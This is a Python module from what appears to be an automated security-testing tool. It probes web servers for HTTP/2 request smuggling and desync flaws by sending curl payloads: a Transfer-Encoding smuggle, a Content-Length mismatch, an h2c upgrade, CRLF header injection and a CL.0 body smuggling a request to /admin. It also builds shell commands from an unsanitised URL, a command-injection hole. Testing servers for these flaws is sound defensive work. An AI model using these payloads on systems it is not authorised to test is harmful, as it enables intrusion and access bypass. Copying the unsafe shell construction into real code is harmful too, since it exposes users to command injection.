"""HTTP/2 Desync Tester - H2-specific request smuggling for Project Triage v4.

Tests HTTP/2 protocol-level attacks that HTTP/1.1 desync tools miss:
- H2.TE smuggling (Transfer-Encoding header in HTTP/2 frames)
- H2.CL smuggling (Content-Length mismatch in HTTP/2)
- H2C cleartext upgrade exploitation
- CONTINUATION frame abuse
- HTTP/2 header injection via CRLF in pseudo-headers
- Client-side desynchronization (CSD) via CL.0

Research basis: Gap analysis GAP-5, PortSwigger H2 research, James Kettle methodology.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

from utils.utils import run_cmd


@dataclass
class H2DesyncResult:
    """Result of an HTTP/2 desync probe."""
    probe_type: str
    url: str
    vulnerable: bool
    evidence: str
    severity: str
    technique: str = ""


# H2 desync probe configurations
H2_PROBES: list[dict[str, Any]] = [
    {
        "name": "h2_te_smuggling",
        "description": "HTTP/2 Transfer-Encoding injection - front-end strips TE, backend processes it",
        "severity": "critical",
        "curl_flags": [
            "--http2",
            "-H 'Transfer-Encoding: chunked'",
            "-d '0\r\n\r\nSMUGGLED'",
        ],
        "detection": "Look for smuggled content in subsequent response or timeout difference",
    },
    {
        "name": "h2_cl_mismatch",
        "description": "HTTP/2 Content-Length mismatch - send less data than CL declares",
        "severity": "high",
        "curl_flags": [
            "--http2",
            "-H 'Content-Length: 100'",
            "-d 'short'",
        ],
        "detection": "Server hangs waiting for remaining bytes or processes partial request",
    },
    {
        "name": "h2c_upgrade",
        "description": "HTTP/2 cleartext upgrade - bypass TLS-only protections",
        "severity": "high",
        "curl_flags": [
            "-H 'Upgrade: h2c'",
            "-H 'HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA'",
            "-H 'Connection: Upgrade, HTTP2-Settings'",
        ],
        "detection": "101 Switching Protocols response indicates h2c support",
    },
    {
        "name": "h2_header_injection",
        "description": "CRLF injection in HTTP/2 header values surviving to backend",
        "severity": "high",
        "curl_flags": [
            "--http2",
            "-H $'X-Test: value\\r\\nInjected: true'",
        ],
        "detection": "Injected header appears in response or backend behavior changes",
    },
    {
        "name": "cl0_desync",
        "description": "CL.0 desync - server ignores Content-Length on certain endpoints",
        "severity": "critical",
        "curl_flags": [
            "-H 'Content-Length: 0'",
            "-d 'GET /admin HTTP/1.1\\r\\nHost: target\\r\\n\\r\\n'",
        ],
        "detection": "Response contains content from smuggled /admin request",
    },
]

# Client-side desync (CSD) patterns
CSD_PATTERNS: list[dict[str, Any]] = [
    {
        "name": "csd_cl0_browser",
        "description": "Client-side desync via CL.0 - browser as smuggling vector",
        "detection_steps": [
            "Find endpoint that ignores Content-Length (returns 200 regardless of body)",
            "Send POST with body containing a smuggled GET request",
            "If the connection is reused, next browser request gets smuggled response",
        ],
        "severity": "critical",
    },
    {
        "name": "csd_pause_based",
        "description": "Pause-based CSD - server timeout causes connection reuse with leftover data",
        "detection_steps": [
            "Send request with Content-Length larger than actual body",
            "Pause sending - server may timeout and process partial request",
            "Next request on same connection includes leftover bytes as prefix",
        ],
        "severity": "high",
    },
]

# Endpoints likely to be vulnerable to desync
DESYNC_SURFACE_PATTERNS: list[str] = [
    r"/api/",
    r"/upload",
    r"/import",
    r"/webhook",
    r"/callback",
    r"/proxy",
    r"/redirect",
    r"/forward",
    r"/gateway",
    r"/graphql",
    r"/ws",
]


class H2DesyncTester:
    """HTTP/2-specific request smuggling and desync tester."""

    def detect_h2_support(self, url: str) -> dict[str, Any]:
        """Check if target supports HTTP/2 and what versions are available."""
        result = {
            "h2_supported": False,
            "h2c_supported": False,
            "alpn_protocols": [],
            "server": "",
        }

        try:
            # Check ALPN negotiation
            output = run_cmd(
                f"curl -s -o /dev/null -w '%{{http_version}}' --http2 '{url}' --max-time 5"
            )
            version = output.strip().strip("'")
            if version == "2":
                result["h2_supported"] = True

            # Check h2c support
            h2c_output = run_cmd(
                f"curl -s -o /dev/null -w '%{{http_code}}' "
                f"-H 'Upgrade: h2c' "
                f"-H 'Connection: Upgrade, HTTP2-Settings' "
                f"-H 'HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA' "
                f"'{url}' --max-time 5"
            )
            if h2c_output.strip().strip("'") == "101":
                result["h2c_supported"] = True

            # Get server header
            server_output = run_cmd(
                f"curl -s -I '{url}' --max-time 5 | grep -i '^server:'"
            )
            if server_output:
                result["server"] = server_output.strip().split(":", 1)[-1].strip()

        except Exception:
            pass

        return result

    def run_h2_probes(self, url: str) -> list[H2DesyncResult]:
        """Run all HTTP/2 desync probes against a target."""
        results = []

        for probe in H2_PROBES:
            try:
                flags = " ".join(probe["curl_flags"])
                cmd = f"curl -s -o /dev/null -w '%{{http_code}} %{{time_total}}' {flags} '{url}' --max-time 10"
                output = run_cmd(cmd)

                parts = output.strip().strip("'").split()
                status = parts[0] if parts else "0"
                time_total = float(parts[1]) if len(parts) > 1 else 0.0

                # Detect anomalies
                vulnerable = False
                evidence = f"Status: {status}, Time: {time_total:.2f}s"

                if probe["name"] == "h2c_upgrade" and status == "101":
                    vulnerable = True
                    evidence = "Server accepted h2c upgrade - cleartext HTTP/2 available"
                elif probe["name"] == "h2_te_smuggling" and time_total > 5.0:
                    vulnerable = True
                    evidence = f"Timeout ({time_total:.1f}s) suggests TE processing on backend"
                elif probe["name"] == "h2_cl_mismatch" and time_total > 5.0:
                    vulnerable = True
                    evidence = f"Server hung ({time_total:.1f}s) waiting for remaining CL bytes"
                elif status == "500" or status == "502":
                    vulnerable = True
                    evidence = f"Server error ({status}) - possible desync or parsing failure"

                results.append(H2DesyncResult(
                    probe_type=probe["name"],
                    url=url,
                    vulnerable=vulnerable,
                    evidence=evidence,
                    severity=probe["severity"] if vulnerable else "info",
                    technique=probe["description"],
                ))
            except Exception:
                pass

        return results

    def identify_desync_surfaces(self, endpoints: list[str], url: str) -> list[str]:
        """Identify endpoints likely vulnerable to desync based on URL patterns."""
        surfaces = []
        for ep in endpoints:
            ep_lower = ep.lower()
            for pattern in DESYNC_SURFACE_PATTERNS:
                if re.search(pattern, ep_lower):
                    full_url = ep if ep.startswith("http") else f"{url.rstrip('/')}/{ep.lstrip('/')}"
                    if full_url not in surfaces:
                        surfaces.append(full_url)
                    break
        return surfaces

    def generate_hypotheses(
        self,
        url: str,
        h2_support: dict[str, Any],
        endpoints: list[str],
    ) -> list[dict[str, Any]]:
        """Generate HTTP/2 desync hypotheses."""
        hypotheses = []

        if h2_support.get("h2_supported"):
            hypotheses.append({
                "endpoint": url,
                "technique": "h2_te_smuggling",
                "description": "H2.TE request smuggling - inject Transfer-Encoding in HTTP/2 frame",
                "novelty": 9, "exploitability": 7, "impact": 10, "effort": 5,
            })
            hypotheses.append({
                "endpoint": url,
                "technique": "h2_cl_mismatch",
                "description": "H2.CL content-length mismatch smuggling",
                "novelty": 8, "exploitability": 7, "impact": 9, "effort": 5,
            })
            hypotheses.append({
                "endpoint": url,
                "technique": "h2_header_injection",
                "description": "HTTP/2 CRLF header injection surviving to backend",
                "novelty": 8, "exploitability": 7, "impact": 8, "effort": 4,
            })

        if h2_support.get("h2c_supported"):
            hypotheses.append({
                "endpoint": url,
                "technique": "h2c_smuggling",
                "description": "h2c cleartext upgrade - bypass TLS protections and smuggle requests",
                "novelty": 9, "exploitability": 8, "impact": 10, "effort": 4,
            })

        # CL.0 / CSD tests (don't require H2)
        desync_surfaces = self.identify_desync_surfaces(endpoints, url)
        for surface in desync_surfaces[:5]:
            hypotheses.append({
                "endpoint": surface,
                "technique": "cl0_client_side_desync",
                "description": f"CL.0 client-side desync on {surface}",
                "novelty": 9, "exploitability": 6, "impact": 10, "effort": 5,
            })

        return hypotheses
